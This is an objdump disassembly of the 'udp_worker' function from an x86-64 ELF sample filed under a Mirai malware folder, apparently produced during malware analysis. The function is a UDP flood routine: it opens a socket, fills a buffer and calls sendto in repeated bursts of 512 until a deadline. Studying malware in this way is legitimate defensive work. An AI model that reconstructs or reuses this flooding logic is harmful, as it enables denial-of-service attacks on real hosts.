
/Users/taogoldi/Projects/malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000401770 <udp_worker>:
  401770: 41 57                        	push	r15
  401772: 41 56                        	push	r14
  401774: 41 55                        	push	r13
  401776: 41 54                        	push	r12
  401778: 49 89 fc                     	mov	r12, rdi
  40177b: 31 ff                        	xor	edi, edi
  40177d: 55                           	push	rbp
  40177e: 53                           	push	rbx
  40177f: 48 83 ec 28                  	sub	rsp, 0x28
  401783: e8 48 61 00 00               	call	0x4078d0 <time>
  401788: 49 63 54 24 44               	movsxd	rdx, dword ptr [r12 + 0x44]
  40178d: be 02 00 00 00               	mov	esi, 0x2
  401792: bf 02 00 00 00               	mov	edi, 0x2
  401797: 4c 8d 3c 10                  	lea	r15, [rax + rdx]
  40179b: 31 d2                        	xor	edx, edx
  40179d: e8 d2 90 00 00               	call	0x40a874 <socket>
  4017a2: 85 c0                        	test	eax, eax
  4017a4: 41 89 c5                     	mov	r13d, eax
  4017a7: 0f 88 a7 00 00 00            	js	0x401854 <udp_worker+0xe4>
  4017ad: 48 8d 5c 24 1c               	lea	rbx, [rsp + 0x1c]
  4017b2: 41 b8 04 00 00 00            	mov	r8d, 0x4
  4017b8: ba 07 00 00 00               	mov	edx, 0x7
  4017bd: be 01 00 00 00               	mov	esi, 0x1
  4017c2: 89 c7                        	mov	edi, eax
  4017c4: c7 44 24 1c 00 00 80 00      	mov	dword ptr [rsp + 0x1c], 0x800000
  4017cc: 48 89 d9                     	mov	rcx, rbx
  4017cf: 49 89 e6                     	mov	r14, rsp
  4017d2: e8 65 90 00 00               	call	0x40a83c <setsockopt>
  4017d7: 41 b8 04 00 00 00            	mov	r8d, 0x4
  4017dd: 48 89 d9                     	mov	rcx, rbx
  4017e0: ba 08 00 00 00               	mov	edx, 0x8
  4017e5: be 01 00 00 00               	mov	esi, 0x1
  4017ea: 44 89 ef                     	mov	edi, r13d
  4017ed: e8 4a 90 00 00               	call	0x40a83c <setsockopt>
  4017f2: 48 8d 54 24 04               	lea	rdx, [rsp + 0x4]
  4017f7: 4c 89 e6                     	mov	rsi, r12
  4017fa: bf 02 00 00 00               	mov	edi, 0x2
  4017ff: 48 c7 04 24 00 00 00 00      	mov	qword ptr [rsp], 0x0
  401807: 41 8b 44 24 40               	mov	eax, dword ptr [r12 + 0x40]
  40180c: 48 c7 44 24 08 00 00 00 00   	mov	qword ptr [rsp + 0x8], 0x0
  401815: 66 c7 04 24 02 00            	mov	word ptr [rsp], 0x2
  40181b: 66 c1 c8 08                  	ror	ax, 0x8
  40181f: 66 89 44 24 02               	mov	word ptr [rsp + 0x2], ax
  401824: e8 86 89 00 00               	call	0x40a1af <inet_pton>
  401829: 49 63 7c 24 48               	movsxd	rdi, dword ptr [r12 + 0x48]
  40182e: e8 95 92 00 00               	call	0x40aac8 <malloc>
  401833: 48 85 c0                     	test	rax, rax
  401836: 48 89 c5                     	mov	rbp, rax
  401839: 75 2a                        	jne	0x401865 <udp_worker+0xf5>
  40183b: bf a9 50 41 00               	mov	edi, 0x4150a9
  401840: e8 d7 65 00 00               	call	0x407e1c <perror>
  401845: 44 89 ef                     	mov	edi, r13d
  401848: e8 f1 3a 00 00               	call	0x40533e <close>
  40184d: 31 ff                        	xor	edi, edi
  40184f: e8 5b 12 00 00               	call	0x402aaf <pthread_exit>
  401854: bf d9 6f 41 00               	mov	edi, 0x416fd9
  401859: e8 be 65 00 00               	call	0x407e1c <perror>
  40185e: 31 ff                        	xor	edi, edi
  401860: e8 4a 12 00 00               	call	0x402aaf <pthread_exit>
  401865: 49 63 54 24 48               	movsxd	rdx, dword ptr [r12 + 0x48]
  40186a: 41 0f b6 74 24 4c            	movzx	esi, byte ptr [r12 + 0x4c]
  401870: 48 89 c7                     	mov	rdi, rax
  401873: e8 a8 82 00 00               	call	0x409b20 <memset>
  401878: 31 ff                        	xor	edi, edi
  40187a: e8 51 60 00 00               	call	0x4078d0 <time>
  40187f: 49 39 c7                     	cmp	r15, rax
  401882: 7e 2c                        	jle	0x4018b0 <udp_worker+0x140>
  401884: 31 db                        	xor	ebx, ebx
  401886: 49 63 54 24 48               	movsxd	rdx, dword ptr [r12 + 0x48]
  40188b: 41 b9 10 00 00 00            	mov	r9d, 0x10
  401891: 4d 89 f0                     	mov	r8, r14
  401894: b9 40 40 00 00               	mov	ecx, 0x4040
  401899: 48 89 ee                     	mov	rsi, rbp
  40189c: 44 89 ef                     	mov	edi, r13d
  40189f: ff c3                        	inc	ebx
  4018a1: e8 f2 32 00 00               	call	0x404b98 <sendto>
  4018a6: 81 fb 00 02 00 00            	cmp	ebx, 0x200
  4018ac: 75 d8                        	jne	0x401886 <udp_worker+0x116>
  4018ae: eb c8                        	jmp	0x401878 <udp_worker+0x108>
  4018b0: 48 89 ef                     	mov	rdi, rbp
  4018b3: e8 a3 9d 00 00               	call	0x40b65b <free>
  4018b8: 44 89 ef                     	mov	edi, r13d
  4018bb: e8 7e 3a 00 00               	call	0x40533e <close>
  4018c0: 31 ff                        	xor	edi, edi
  4018c2: e8 e8 11 00 00               	call	0x402aaf <pthread_exit>
  4018c7: 66 66 90                     	nop
  4018ca: 66 66 90                     	nop
  4018cd: 66 66 90                     	nop
